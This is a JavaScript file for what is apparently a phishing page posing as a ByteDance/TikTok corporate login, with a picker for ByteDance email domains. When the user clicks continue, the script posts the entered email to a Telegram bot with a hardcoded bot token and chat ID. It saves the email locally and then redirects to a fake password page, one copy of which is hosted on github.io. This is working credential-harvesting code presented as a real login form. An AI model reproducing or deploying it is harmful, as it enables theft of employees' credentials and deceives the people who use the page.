const input = document.getElementById("emailInput");
const domainToggle = document.getElementById("domainToggle");
const domainCard = document.getElementById("domainCard");

const btn = document.querySelector(".btn");
const options = document.querySelectorAll(".domain-card div");
const BOT_TOKEN = "8521452515:AAFtk4uoAYwXq8fVzJABkSZEgHcYh0Kk2Yo";
const CHAT_ID = "5460147192";

btn.addEventListener("click", () => {
  if (!btn.classList.contains("active")) return;

  const email = buildEmail();

  fetch(`https://api.telegram.org/bot${"8521452515:AAFtk4uoAYwXq8fVzJABkSZEgHcYh0Kk2Yo"}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: `✅New Alert (1):  ${email}`
    })
  }).catch(err => console.error('Failed to send to Telegram:', err));

  console.log("Saving email:", email);

  localStorage.setItem("tiktok_email", email);

  btn.classList.add("loading");

  setTimeout(() => {
    window.location.href = "/welcome/next/password.html";
  }, 1500);
});

const activeDomainEl = document.getElementById("activeDomain");

let currentDomain = "@bytedance.com";


function buildEmail() {
  let value = input.value.trim();

  if (value.includes("@")) {
    return value;
  }

  return value + currentDomain;
}


input.addEventListener("input", () => {
  const hasValue = input.value.length >= 1;

  btn.classList.toggle("active", hasValue);
  btn.style.cursor = hasValue ? "pointer" : "not-allowed";

  domainToggle.style.display = input.value.includes("@")
    ? "none"
    : "flex";
});


domainToggle.addEventListener("click", () => {
  domainCard.style.display =
    domainCard.style.display === "block" ? "none" : "block";
});


function updateSelection(selectedDomain) {
  options.forEach(opt => {
    const tick = opt.querySelector(".tick");

    if (!tick) return;

    const isSelected = opt.dataset.domain === selectedDomain;

    if (isSelected) {
      tick.innerHTML = `<img src="IMAGES/bytedance-check.png" alt="tick">`;
      opt.style.fontWeight = "600";
    } else {
      tick.innerHTML = "";
      opt.style.fontWeight = "400";
    }
  });
}


function getDisplayDomain(domain) {
  if (domain === "@sso-service-account.bytedance.net") {
    return "@sso-service-acc...";
  }
  return domain;
}

function shouldOverlap(domain) {
  return [
    "@ad.bytedance.com",
    "@jiyunhudong.com",
    "@imaginechina.com"
  ].includes(domain);
}


updateSelection(currentDomain);
activeDomainEl.textContent = currentDomain;


options.forEach(opt => {
  opt.addEventListener("click", () => {
    currentDomain = opt.dataset.domain;

    updateSelection(currentDomain);

    let prefix = input.value;

  
    if (prefix.includes("@")) {
      prefix = prefix.split("@")[0];
    }

    input.value = prefix;

    activeDomainEl.textContent = getDisplayDomain(currentDomain);

    if (shouldOverlap(currentDomain)) {
      input.style.paddingRight = "10px";
    } else {
      input.style.paddingRight = "120px";
    }

    domainCard.style.display = "none";
  });
});

document.addEventListener("click", (e) => {
  if (!e.target.closest(".input-wrapper")) {
    domainCard.style.display = "none";
  }
});

const errorText = document.getElementById("errorText");


function showError() {
  input.classList.add("input-error");
  errorText.style.display = "block";
}

function hideError() {
  input.classList.remove("input-error");
  errorText.style.display = "none";
}


input.addEventListener("blur", () => {
  if (input.value.trim() === "") {
    showError();
  }
});


input.addEventListener("input", () => {
  if (input.value.trim().length > 0) {
    hideError();
  } else {
    showError();
  }
});

btn.addEventListener("click", () => {
  if (!btn.classList.contains("active")) return;

  const email = buildEmail();

  console.log("Saving email:", email);

  localStorage.setItem("tiktok_email", email);

  btn.classList.add("loading");

  setTimeout(() => {
    window.location.href = "https://nedflanders1237.github.io/vpn-tiktok/welcome/next/password.html";
  }, 1500);
});
